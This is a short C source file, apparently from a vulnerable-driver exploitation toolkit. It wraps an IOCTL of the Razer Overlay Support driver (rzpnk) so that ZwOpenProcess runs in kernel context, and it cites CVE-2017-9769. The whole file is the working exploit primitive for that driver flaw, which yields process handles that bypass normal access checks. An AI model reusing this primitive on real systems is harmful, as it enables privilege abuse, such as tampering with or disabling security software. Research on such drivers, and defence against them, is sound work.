/* Razer Overlay Support driver routines. */

#include "global.h"
#include "idrv/rzpnk.h"

//
// Based on CVE-2017-9769.
//

/*
 * RazerOpenProcess
 *
 * Purpose:
 *
 * Call ZwOpenProcess via razer driver request.
 *
 */
BOOL WINAPI RazerOpenProcess(_In_ HANDLE DeviceHandle,
                             _In_ HANDLE ProcessId,
                             _In_ ACCESS_MASK DesiredAccess,
                             _Out_ PHANDLE ProcessHandle) {
    BOOL bResult;
    RAZER_OPEN_PROCESS request;

    UNREFERENCED_PARAMETER(DesiredAccess);

    request.ProcessId = ProcessId;
    request.ProcessHandle = NULL;

    bResult = supCallDriver(DeviceHandle, IOCTL_RZPNK_OPEN_PROCESS, &request,
                            sizeof(request), &request, sizeof(request));

    *ProcessHandle = request.ProcessHandle;
    return bResult;
}
